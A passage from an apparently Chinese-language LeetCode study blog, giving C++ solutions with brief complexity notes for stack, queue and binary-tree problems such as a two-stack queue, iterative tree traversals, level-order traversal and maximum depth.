left;<br>        <span class="hljs-type">int</span> len=s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;(&#x27;</span>||s[i]==<span class="hljs-string">&#x27;&#123;&#x27;</span>||s[i]==<span class="hljs-string">&#x27;[&#x27;</span>)<br>            &#123;<br>                left.<span class="hljs-built_in">push</span>(s[i]);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(left.<span class="hljs-built_in">empty</span>())<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-type">char</span> ch=left.<span class="hljs-built_in">top</span>();<br>                left.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;)&#x27;</span>&amp;&amp;ch!=<span class="hljs-string">&#x27;(&#x27;</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;&#125;&#x27;</span>&amp;&amp;ch!=<span class="hljs-string">&#x27;&#123;&#x27;</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;]&#x27;</span>&amp;&amp;ch!=<span class="hljs-string">&#x27;[&#x27;</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(left.<span class="hljs-built_in">size</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li><p>时间复杂度：O(n)，n为字符串长度</p></li><li><p>栈，字符串</p></li></ul><h3 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232. 用栈实现队列"></a><a href="https://leetcode-cn.com/problems/implement-queue-using-stacks/">232. 用栈实现队列</a></h3><p>请你仅使用两个栈实现先入先出队列。队列应当支持一般队列支持的所有操作（push、pop、peek、empty）：</p><p>实现 MyQueue 类：</p><p>void push(int x) 将元素 x 推到队列的末尾<br>int pop() 从队列的开头移除并返回元素<br>int peek() 返回队列开头的元素<br>boolean empty() 如果队列为空，返回 true ；否则，返回 false</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyQueue</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    stack&lt;<span class="hljs-type">int</span>&gt; a;<br>    stack&lt;<span class="hljs-type">int</span>&gt; b;<br>    <span class="hljs-built_in">MyQueue</span>() &#123;<br><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        a.<span class="hljs-built_in">push</span>(x);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">//构建b：按队列顺序出栈</span><br>        <span class="hljs-keyword">while</span>(!a.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            b.<span class="hljs-built_in">push</span>(a.<span class="hljs-built_in">top</span>());<br>            a.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-comment">//记录返回值，且去掉队首元素</span><br>        <span class="hljs-type">int</span> ret=b.<span class="hljs-built_in">top</span>();<br>        b.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-comment">//恢复a</span><br>        <span class="hljs-keyword">while</span>(!b.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            a.<span class="hljs-built_in">push</span>(b.<span class="hljs-built_in">top</span>());<br>            b.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">peek</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">//构建b：按队列顺序出栈</span><br>        <span class="hljs-keyword">while</span>(!a.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            b.<span class="hljs-built_in">push</span>(a.<span class="hljs-built_in">top</span>());<br>            a.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-comment">//记录返回值</span><br>        <span class="hljs-type">int</span> ret=b.<span class="hljs-built_in">top</span>();<br>        <span class="hljs-comment">//恢复a</span><br>        <span class="hljs-keyword">while</span>(!b.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            a.<span class="hljs-built_in">push</span>(b.<span class="hljs-built_in">top</span>());<br>            b.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> a.<span class="hljs-built_in">empty</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your MyQueue object will be instantiated and called as such:</span><br><span class="hljs-comment"> * MyQueue* obj = new MyQueue();</span><br><span class="hljs-comment"> * obj-&gt;push(x);</span><br><span class="hljs-comment"> * int param_2 = obj-&gt;pop();</span><br><span class="hljs-comment"> * int param_3 = obj-&gt;peek();</span><br><span class="hljs-comment"> * bool param_4 = obj-&gt;empty();</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><ul><li>栈，设计，队列</li></ul><h2 id="第-10-天-树"><a href="#第-10-天-树" class="headerlink" title="第 10 天 树"></a>第 10 天 树</h2><h3 id="144-二叉树的前序遍历"><a href="#144-二叉树的前序遍历" class="headerlink" title="144. 二叉树的前序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/">144. 二叉树的前序遍历</a></h3><p>给你二叉树的根节点 <code>root</code> ，返回它节点值的 <strong>前序</strong> 遍历。</p><h4 id="迭代法"><a href="#迭代法" class="headerlink" title="迭代法"></a>迭代法</h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//根 左 右</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; ret;<br>        stack&lt;TreeNode*&gt; data; <span class="hljs-comment">//待处理数据</span><br>        TreeNode* p=root;<br>        <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(p-&gt;right!=<span class="hljs-literal">NULL</span>)<br>                data.<span class="hljs-built_in">push</span>(p-&gt;right);<br>            <span class="hljs-keyword">if</span>(p-&gt;left!=<span class="hljs-literal">NULL</span>)<br>                data.<span class="hljs-built_in">push</span>(p-&gt;left);<br>            ret.<span class="hljs-built_in">push_back</span>(p-&gt;val);<br>            <span class="hljs-keyword">if</span>(data.<span class="hljs-built_in">empty</span>())<br>                <span class="hljs-keyword">break</span>;<br>            p=data.<span class="hljs-built_in">top</span>();<br>            data.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为节点个数</li><li>栈，树，二叉树</li></ul><p>模板：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//根 左 右</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-keyword">if</span>(!root) <br>            <span class="hljs-keyword">return</span> result;<br>        stack&lt;TreeNode*&gt; stk; <br>        stk.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span>(!stk.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            TreeNode* node = stk.<span class="hljs-built_in">top</span>();<br>            stk.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span>(node)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(node -&gt; right)&#123;<br>                    stk.<span class="hljs-built_in">push</span>(node -&gt; right);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(node -&gt; left)&#123;<br>                    stk.<span class="hljs-built_in">push</span>(node -&gt; left);<br>                &#125; <br>                stk.<span class="hljs-built_in">push</span>(node);<br>                stk.<span class="hljs-built_in">push</span>(<span class="hljs-literal">nullptr</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                result.<span class="hljs-built_in">push_back</span>(stk.<span class="hljs-built_in">top</span>()-&gt;val);<br>                stk.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94. 二叉树的中序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">94. 二叉树的中序遍历</a></h3><p>给定一个二叉树的根节点 <code>root</code> ，返回 <em>它的 <strong>中序</strong> 遍历</em> 。</p><h4 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//左 根 右</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; ret;<br>        stack&lt;TreeNode*&gt; data; <span class="hljs-comment">//待处理数据</span><br>        TreeNode* p=root;<br>        <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>||!data.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>) <span class="hljs-comment">//左链入栈</span><br>            &#123;<br>                data.<span class="hljs-built_in">push</span>(p);<br>                p=p-&gt;left;<br>            &#125;<br>            p=data.<span class="hljs-built_in">top</span>();<br>            data.<span class="hljs-built_in">pop</span>();<br>            ret.<span class="hljs-built_in">push_back</span>(p-&gt;val);<br>            p=p-&gt;right;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为节点个数</li><li>栈，树，二叉树</li></ul><p>模板：</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">class Solution &#123;<br>public:<br>    //左 根 右<br>    vector<span class="hljs-tag">&lt;int&gt;</span> inorderTraversal(TreeNode* root) &#123;<br>        vector<span class="hljs-tag">&lt;int&gt;</span> result;<br>        if(!root) <br>            return result;<br>        stack<span class="hljs-tag">&lt;TreeNode*&gt;</span> stk; <br>        stk.push(root);<br>        while(!stk.empty())<br>        &#123;<br>            TreeNode* <span class="hljs-keyword">node</span> <span class="hljs-title">= stk</span>.top();<br>            stk.pop();<br>            if(<span class="hljs-keyword">node</span><span class="hljs-title">)</span><br><span class="hljs-title">            &#123;</span><br><span class="hljs-title">                if</span>(<span class="hljs-keyword">node</span> <span class="hljs-title">-&gt; right</span>)&#123;<br>                    stk.push(<span class="hljs-keyword">node</span> <span class="hljs-title">-&gt; right</span>);<br>                &#125;<br>                stk.push(<span class="hljs-keyword">node</span><span class="hljs-title">);</span><br><span class="hljs-title">                stk</span>.push(nullptr); //分隔父节点和子节点，作为输出（入结果栈）标识                <br>                if(<span class="hljs-keyword">node</span> <span class="hljs-title">-&gt; left</span>)&#123;<br>                    stk.push(<span class="hljs-keyword">node</span> <span class="hljs-title">-&gt; left</span>);<br>                &#125; <br>            &#125;<br>            else<br>            &#123;<br>                result.push_back(stk.top()-&gt;val);<br>                stk.pop();<br>            &#125;<br>        &#125;<br>        return result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="145-二叉树的后序遍历"><a href="#145-二叉树的后序遍历" class="headerlink" title="145. 二叉树的后序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">145. 二叉树的后序遍历</a></h3><p>给你一棵二叉树的根节点 <code>root</code> ，返回其节点值的 <strong>后序遍历</strong> 。</p><h4 id="迭代-1"><a href="#迭代-1" class="headerlink" title="迭代"></a>迭代</h4><p>模板：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//左 右 根</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">postorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-keyword">if</span>(!root) <br>            <span class="hljs-keyword">return</span> result;<br>        stack&lt;TreeNode*&gt; stk; <br>        stk.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span>(!stk.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            TreeNode* node = stk.<span class="hljs-built_in">top</span>();<br>            stk.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span>(node)<br>            &#123;<br>                stk.<span class="hljs-built_in">push</span>(node);<br>                stk.<span class="hljs-built_in">push</span>(<span class="hljs-literal">nullptr</span>); <span class="hljs-comment">//分隔父节点和子节点，作为输出（入结果栈）标识</span><br>                <span class="hljs-keyword">if</span>(node -&gt; right)&#123;<br>                    stk.<span class="hljs-built_in">push</span>(node -&gt; right);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(node -&gt; left)&#123;<br>                    stk.<span class="hljs-built_in">push</span>(node -&gt; left);<br>                &#125; <br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                result.<span class="hljs-built_in">push_back</span>(stk.<span class="hljs-built_in">top</span>()-&gt;val);<br>                stk.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h2 id="第-11-天-树"><a href="#第-11-天-树" class="headerlink" title="第 11 天 树"></a>第 11 天 树</h2><h3 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h3><p>给你二叉树的根节点 <code>root</code> ，返回其节点值的 <strong>层序遍历</strong> 。 （即逐层地，从左到右访问所有节点）。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">levelOrder</span>(TreeNode* root) &#123;<br>        queue&lt;TreeNode*&gt; now; <span class="hljs-comment">//当前层，先进先出</span><br>        now.<span class="hljs-built_in">push</span>(root);<br>        TreeNode* p;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-keyword">while</span>(!now.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            queue&lt;TreeNode*&gt; next; <span class="hljs-comment">//下一层</span><br>            vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>            <span class="hljs-keyword">while</span>(!now.<span class="hljs-built_in">empty</span>())<br>            &#123;<br>                p=now.<span class="hljs-built_in">front</span>();<br>                now.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span>(p)<br>                &#123;<br>                    vec.<span class="hljs-built_in">push_back</span>(p-&gt;val);<br>                    <span class="hljs-keyword">if</span>(p-&gt;left)<br>                        next.<span class="hljs-built_in">push</span>(p-&gt;left);<br>                    <span class="hljs-keyword">if</span>(p-&gt;right)<br>                        next.<span class="hljs-built_in">push</span>(p-&gt;right);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!vec.<span class="hljs-built_in">empty</span>())<br>                result.<span class="hljs-built_in">push_back</span>(vec);<br>            now=next;   <br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为节点个数</li><li>树，广度优先搜索，二叉树</li></ul><h3 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104. 二叉树的最大深度"></a><a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></h3><p>给定一个二叉树，找出其最大深度。</p><p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p><p>说明: 叶子节点是指没有子节点的节点。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> root==<span class="hljs-literal">NULL</span>? <span class="hljs-number">0</span> : <span class="hljs-built_in">max</span>(<span class="hljs-built_in">maxDepth</span>(root-&gt;left),<span class="hljs-built_in">maxDepth</span>(root-&gt;right))+<span class="hljs-number">1</span>; <br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为节点个数</li><li>树，深度优先搜索，二叉树</li></ul><h3 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101. 对称二叉树"></a><a href="https://leetcode-cn.com/problems/symmetric-tree/">101. 对称二叉树</a></h3><p>给你一个二叉树的根节点 <code>root</code> ， 检查它是否轴对称。</p><h4 id="迭代法-1"><a href="#迭代法-1" class="headerlink" title="迭代法"></a>迭代法</h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 